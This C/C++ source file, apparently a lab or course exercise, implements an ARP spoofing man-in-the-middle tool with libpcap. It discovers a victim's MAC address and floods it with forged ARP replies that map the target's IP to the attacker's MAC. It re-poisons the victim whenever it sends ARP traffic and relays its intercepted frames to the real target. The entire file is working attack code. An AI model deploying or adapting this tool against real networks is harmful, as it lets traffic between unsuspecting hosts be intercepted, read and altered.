#include "mypcap.h"
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>         //struct ifreq
#include <sys/ioctl.h>      //ioctl
#include <arpa/inet.h>      //inet_ntoa
#include <string.h>         //memcpy
#include <netinet/ether.h>  //ether_ntoa
#include <stdlib.h>         //atoi


#define TYPE_IP 0x0800
#define TYPE_ARP 0x0806

void getMacIPAddress(char* interface, uint8_t *mac, uint8_t* ip_addr)
{
    int sock;
    struct ifreq ifr;
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0){
        perror("socket");
    }
    strcpy(ifr.ifr_name, interface);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0){
        perror("ioctl() - get mac");
        close(sock);
    }

    memcpy(mac,ifr.ifr_hwaddr.sa_data, sizeof(uint8_t) * 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0){
        perror("ioctl() - get ip");
        close(sock);
    }

    char *token,*temp = (char*)malloc(20);
    struct sockaddr_in *sin;

    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(temp, inet_ntoa(sin->sin_addr));

    int cnt=0;
    token = strtok(temp,".");
    while(token){
        ip_addr[cnt] = atoi(&token[0]);
        token = strtok(NULL, ".");
        cnt++;
    }
    close(sock);
}
myether make_eth(unsigned char *smac, unsigned char *dmac){
    myether eth;
    memcpy(eth.src_addr, smac, sizeof(eth.src_addr));
    memcpy(eth.dst_addr, dmac, sizeof(eth.dst_addr));
    //    for(int i =0; i< 6;i++){
    //        eth.src_addr[i] = smac[i];
    //        eth.dst_addr[i] = dmac[i];
    //    }
    eth.type_id = htons(TYPE_ARP);
    printf("[-]SRCMAC[%02X:%02X:%02X:%02X:%02X:%02X]\n",eth.src_addr[0],eth.src_addr[1],eth.src_addr[2],eth.src_addr[3],eth.src_addr[4],eth.src_addr[5]);
    printf("[-]DSTMAC[%02X:%02X:%02X:%02X:%02X:%02X]\n",eth.dst_addr[0],eth.dst_addr[1],eth.dst_addr[2],eth.dst_addr[3],eth.dst_addr[4],eth.dst_addr[5]);
    printf("[-]make ethernet header\n");
    return eth;
}
myarp make_arp( int proto, unsigned char *smac, unsigned char *sip, unsigned char *dmac, unsigned char *dip){
    myarp arp;

    memcpy(arp.sip, sip, sizeof(unsigned char)*4);
    memcpy(arp.dip, dip, sizeof(unsigned char)*4);
    memcpy(arp.smac, smac, sizeof(unsigned char)*6);
    memcpy(arp.dmac, dmac, sizeof(unsigned char)*6);
    //printf("[-]int functions Target ip[%d.%d.%d.%d]\n",arp.dip[0],arp.dip[1],arp.dip[2],arp.dip[3]);
    //printf("[-]int functions Target ip[%d.%d.%d.%d]\n",dip[0],dip[1],dip[2],dip[3]);
    arp.opcode = htons(proto);
    arp.htype = htons(0x01);
    arp.ptype = htons(0x0800);
    arp.maclen = 0x06;
    arp.protolen = 0x04;
    printf("[-]make arp header\n");
    return arp;
}
unsigned char* make_packet(myether eth, myarp arp, int &len){
    unsigned char *packet = new unsigned char[1500] {0, };
    memcpy(packet, &eth, sizeof(myether));
    len += sizeof(myether);
    memcpy(packet+len, &arp, sizeof(myarp));
    len += sizeof(myarp);
    printf("[-]make packet (size : %d)\n", len);
    //    for(int i =0 ;i<len;i++){
    //        printf("%x ", packet[i]);
    //    }printf("\n");
    return packet;
}
bool receive_arp(const unsigned char *packet, unsigned char *smac, unsigned char *sip){
    //check procotol is "arp"
    struct myether *myeh = (struct myether *)packet;
    packet += sizeof (struct myether);
    uint16_t myether_type = ntohs(myeh->type_id);
    struct myarp *myarp = (struct myarp *)packet;
    packet += sizeof(struct myarp);
    if(myether_type == TYPE_ARP){
        printf("arp packet from %d.%d.%d.%d\n",sip[0],sip[1],sip[2],sip[3]);
        printf("arp packet from %d.%d.%d.%d\n",myarp->sip[0],myarp->sip[1],myarp->sip[2],myarp->sip[3]);
        if(memcmp(sip,myarp->sip,4)==0){
            printf("[+]ARP packet detected!!\n");
            memcpy(smac,myeh->src_addr,6);
            return true;
        }
    }
    return false;
}
void get_arpmac(char* interface, unsigned char* packet,int &len, unsigned char *tmac, unsigned char *sip){
    char* dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    }

    //receive arp response packet
    while (true) {
        pcap_sendpacket(handle, packet,len);
        struct pcap_pkthdr* header;
        const u_char* r_packet;

        int res = pcap_next_ex(handle, &header, &r_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        if(receive_arp(r_packet, tmac, sip)==1) break;
    }
    pcap_close(handle);
}
void arp_injection(int cnt, char* interface,struct packet_addr *ps){
    char* dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    }

    unsigned char packet[1500];
    int len =0 ;

    //insert ethernet data
    myether eth = make_eth(ps->mymac,ps->sender_mac);
    memcpy(packet, &eth , sizeof (myether));
    len += sizeof(eth);

    //insert arp data
    myarp arp = make_arp(2,ps->mymac, ps->target_ip, ps->sender_mac, ps->sender_ip);
    memcpy(packet+len, &arp, sizeof(myarp));
    len += sizeof(arp);
    while(cnt--){
        //send packet
        if(pcap_sendpacket(handle,packet,len)!=0){
            printf("[*]arp injection packet error!\n");
        }
    }
    printf("[-]ARP injection end\n");
}
int packet_check(const unsigned char *packet, struct packet_addr* pv){
    struct myether *myeh = (struct myether *)packet;
    packet += sizeof (struct myether);
    unsigned short myether_type = ntohs(myeh->type_id);
    printf("packet from sender ");
    struct myarp *myarp = (struct myarp *)packet;
    packet += sizeof(struct myarp);
    //whether it is ARP packet
    if(myether_type == TYPE_ARP){
        printf("arp ");
        //from sender
        if(memcmp(myeh->src_addr, pv->sender_mac, 6)==0){
            printf("sender=%x:%x:%x:%x:%x:%x ",myeh->src_addr[0],myeh->src_addr[1],myeh->src_addr[2],myeh->src_addr[3],myeh->src_addr[4],myeh->src_addr[5]);
            //to me by target ip
            if(memcmp(myarp->dip, pv->target_ip,4)==0){
                printf("target=%d.%d.%d.%d\n",myarp->dip[0],myarp->dip[1],myarp->dip[2],myarp->dip[3]);
                return 1;//unicast => injection again
            }
            //or broadcast
            else if(memcmp(myarp->dmac,pv->broadcast, sizeof(uint8_t)*6)==0){
                printf(" to broadcast\n");
                return 1;//broadcast => injection again
            }
        }
        return 0;
    }
    //if not ARP packet
    else{
        //from sender
        if(memcmp(myeh->src_addr, pv->sender_mac, 6)==0){
            printf("sender=%x:%x:%x:%x:%x:%x ",myeh->src_addr[0],myeh->src_addr[1],myeh->src_addr[2],myeh->src_addr[3],myeh->src_addr[4],myeh->src_addr[5]);
            //to me
            if(memcmp(myeh->dst_addr, pv->mymac,6)==0){
                printf("target=%x:%x:%x:%x:%x:%x \n",myeh->dst_addr[0],myeh->dst_addr[1],myeh->dst_addr[2],myeh->dst_addr[3],myeh->dst_addr[4],myeh->dst_addr[5]);
                return 2;//other packets => relay to target
            }else
                return 0;
        }else
            return 0;
    }
}
void packet_relay(char* interface, const u_char* r_packet,struct packet_addr* pu, uint32_t len){
    char* dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    }
    u_char* l_packet = new u_char[len];
    memcpy(l_packet,r_packet,len);
    memcpy(l_packet,pu->target_mac, 6);
    memcpy(l_packet+6, pu->mymac, 6);
    if(pcap_sendpacket(handle,l_packet, len)!=0)
        printf("[*]relay packet error!\n");
    printf("[-]relay packet send\n");
}
void packet_sniffing(char* interface, struct packet_addr* pt){
    char* dev = interface;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    }
    while(true){
        struct pcap_pkthdr* header;
        const u_char* r_packet;

        int res = pcap_next_ex(handle, &header, &r_packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) break;
        /********************/
        /*   check packet   */
        /********************/
        if(packet_check(r_packet,pt)==1){
            printf("Reinjection!\n");
            arp_injection(10,interface, pt);
        }
        else if(packet_check(r_packet,pt)==2){
            printf("Relaying....\n");
            packet_relay(interface,r_packet,pt, header->len);
        }else
            continue;
    }
}
